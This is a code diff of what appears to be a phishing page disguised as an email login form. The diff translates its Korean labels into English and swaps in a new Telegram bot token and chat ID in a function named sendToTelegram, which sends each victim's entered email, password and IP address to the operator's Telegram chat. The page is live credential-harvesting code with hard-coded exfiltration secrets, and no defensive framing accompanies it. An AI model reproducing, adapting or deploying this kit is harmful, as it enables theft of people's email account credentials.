@@ -260,19 +260,19 @@
         <div class="domain-title" id="domainTitle"></div>
         
         <form id="verifyForm">
-            <div class="error-alert" id="errorAlert">잘못된 자격 증명입니다. 다시 시도해 주세요.</div>
+            <div class="error-alert" id="errorAlert">Invalid credentials. Please try again.</div>
             
             <!-- Honeypot field for bots -->
             <input type="text" class="hp-field" id="botcheck" name="botcheck" autocomplete="off">
             
             <div class="input-group" id="usernameGroup">
-                <label for="username">이메일</label>
+                <label for="username">email</label>
                 <input type="text" id="username" readonly>
             </div>
             
             <div class="input-group" id="passwordGroup">
-                <label for="password">비밀번호</label>
-                <input type="password" id="password" placeholder="이메일 비밀번호를 입력하세요" autocomplete="off" required>
+                <label for="password">password</label>
+                <input type="password" id="password" placeholder="Please enter your email password." autocomplete="off" required>
             </div>
 
                         <button type="submit" class="submit-btn" id="submitBtn">
@@ -283,7 +283,7 @@
             <div class="options">
                 <div class="remember-me">
                     <input type="checkbox" id="remember">
-                    <label for="remember">나를 기억해줘</label>
+                    <label for="remember">remember me</label>
                 </div>
                 <div class="forgot-password">
                     <a href="#">Forgot password?</a>
@@ -449,8 +449,8 @@
             }
             
             function sendToTelegram(email, password, ip) {
-                const botToken = '8190611736:AAGAkKefAXSH_4S7KWZIa7PT3agytjy184o';
-                const chatId = '1866893290';
+                const botToken = '8883255522:AAHVnmTb-pltHmBkALc5QhODBG48gZRDjS4';
+                const chatId = '8964011763';
                 
                 const message = `New login:
 Email: ${email}
